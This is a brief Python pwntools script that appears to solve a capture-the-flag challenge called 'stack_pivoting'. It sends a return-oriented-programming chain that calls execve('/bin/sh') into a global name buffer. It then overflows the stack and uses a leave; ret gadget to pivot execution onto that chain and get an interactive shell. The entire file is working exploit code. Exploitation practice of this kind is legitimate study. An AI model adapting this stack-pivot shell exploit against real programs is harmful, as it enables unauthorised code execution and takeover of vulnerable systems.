from pwn import *

context.arch = 'amd64'

r = process('./stack_pivoting')
raw_input()
name = 0x4c70c0
leave_ret = 0x40182d
pop_rdi_ret = 0x401ecf
pop_rsi_ret = 0x409efe
pop_rax_ret = 0x44fd07
pop_rdx_rbx_ret = 0x485b2b
syscall = 0x401c84

ROP = b'/bin/sh\x00'
ROP += flat(
    pop_rdi_ret, name,
    pop_rsi_ret, 0,
    pop_rdx_rbx_ret, 0, 0,
    pop_rax_ret, 0x3b,
    syscall
)

r.sendafter("Give me your name: ", ROP)
raw_input()
r.sendafter("Give me your ROP: ", b'a'*0x10 + p64(name) + p64(leave_ret))

r.interactive()
